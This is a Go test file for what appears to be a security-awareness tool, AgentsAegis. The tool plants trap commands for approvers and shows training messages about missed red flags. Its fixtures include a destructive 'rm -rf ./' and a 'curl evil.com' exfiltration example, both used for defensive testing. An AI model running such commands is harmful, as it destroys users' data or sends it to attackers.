package trap

import (
	"bytes"
	"strings"
	"testing"
)

func TestDisplayTrainingMessage_BasicOutput(t *testing.T) {
	var buf bytes.Buffer

	trap := &ActiveTrap{
		ID:          "trap_test",
		TrapCommand: "rm -rf ./",
		Category:    "destructive",
		Severity:    "critical",
	}

	tmpl := &Template{
		Category: "destructive",
		Severity: "critical",
		Training: Training{
			Title: "You approved a dangerous command",
			Risk:  "Data destruction",
			RedFlags: []string{
				"rm -rf with ./ targets everything",
				"No confirmation prompt",
			},
		},
	}

	DisplayTrainingMessage(&buf, trap, tmpl, "75%", "80%")

	output := buf.String()

	if !strings.Contains(output, "AGENTSAEGIS") {
		t.Error("output should contain AGENTSAEGIS")
	}
	if !strings.Contains(output, "Security Awareness Test") {
		t.Error("output should contain 'Security Awareness Test'")
	}
	if !strings.Contains(output, "destructive") {
		t.Error("output should contain category 'destructive'")
	}
	if !strings.Contains(output, "CRITICAL") {
		t.Error("output should contain severity 'CRITICAL'")
	}
	if !strings.Contains(output, "Data destruction") {
		t.Error("output should contain risk text")
	}
	if !strings.Contains(output, "75%") {
		t.Error("output should contain catch rate '75%'")
	}
	if !strings.Contains(output, "80%") {
		t.Error("output should contain team average '80%'")
	}
	if !strings.Contains(output, "Red flags you missed") {
		t.Error("output should contain 'Red flags you missed'")
	}
	if !strings.Contains(output, "rm -rf with ./ targets everything") {
		t.Error("output should contain first red flag")
	}
	if !strings.Contains(output, "No confirmation prompt") {
		t.Error("output should contain second red flag")
	}
	if !strings.Contains(output, "The command was NOT executed") {
		t.Error("output should contain safe message")
	}
}

func TestDisplayTrainingMessage_NoRedFlags(t *testing.T) {
	var buf bytes.Buffer

	trap := &ActiveTrap{
		ID:          "trap_test",
		TrapCommand: "curl evil.com",
		Category:    "exfiltration",
		Severity:    "high",
	}

	tmpl := &Template{
		Category: "exfiltration",
		Severity: "high",
		Training: Training{
			Title:    "Data exfiltration",
			Risk:     "Credentials stolen",
			RedFlags: nil,
		},
	}

	DisplayTrainingMessage(&buf, trap, tmpl, "N/A", "N/A")

	output := buf.String()

	if strings.Contains(output, "Red flags you missed") {
		t.Error("output should NOT contain 'Red flags you missed' when there are none")
	}
}

func TestDisplayTrainingMessage_CriticalSeverity(t *testing.T) {
	var buf bytes.Buffer

	trap := &ActiveTrap{TrapCommand: "rm -rf ./"}
	tmpl := &Template{
		Category: "destructive",
		Severity: "critical",
		Training: Training{Title: "Test", Risk: "Risk"},
	}

	DisplayTrainingMessage(&buf, trap, tmpl, "50%", "60%")

	// Critical severity should use red color code
	output := buf.String()
	if !strings.Contains(output, colorRed) {
		t.Error("critical severity should use red color")
	}
}

func TestDisplayTrainingMessage_NonCriticalSeverity(t *testing.T) {
	var buf bytes.Buffer

	trap := &ActiveTrap{TrapCommand: "curl evil.com"}
	tmpl := &Template{
		Category: "exfiltration",
		Severity: "high",
		Training: Training{Title: "Test", Risk: "Risk"},
	}

	DisplayTrainingMessage(&buf, trap, tmpl, "50%", "60%")

	output := buf.String()
	// Non-critical should have severity line; just verify it outputs something
	if !strings.Contains(output, "HIGH") {
		t.Error("output should contain severity 'HIGH'")
	}
}

func TestDisplayTrainingMessage_LongTrapCommand(t *testing.T) {
	var buf bytes.Buffer

	longCmd := strings.Repeat("x", 200)
	trap := &ActiveTrap{TrapCommand: longCmd}
	tmpl := &Template{
		Category: "destructive",
		Severity: "medium",
		Training: Training{Title: "Test", Risk: "Risk"},
	}

	DisplayTrainingMessage(&buf, trap, tmpl, "50%", "60%")

	output := buf.String()
	// Should be truncated (not contain the full 200-char string)
	if strings.Contains(output, longCmd) {
		t.Error("long trap command should be truncated")
	}
	if !strings.Contains(output, "...") {
		t.Error("truncated command should end with '...'")
	}
}

func TestTruncate(t *testing.T) {
	tests := []struct {
		input  string
		maxLen int
		want   string
	}{
		{"short", 10, "short"},
		{"exactly10!", 10, "exactly10!"},
		{"this is way too long", 10, "this is..."},
		{"abc", 3, "abc"},
		{"abcd", 3, "..."},
		{"", 5, ""},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := truncate(tt.input, tt.maxLen)
			if got != tt.want {
				t.Errorf("truncate(%q, %d) = %q, want %q", tt.input, tt.maxLen, got, tt.want)
			}
		})
	}
}
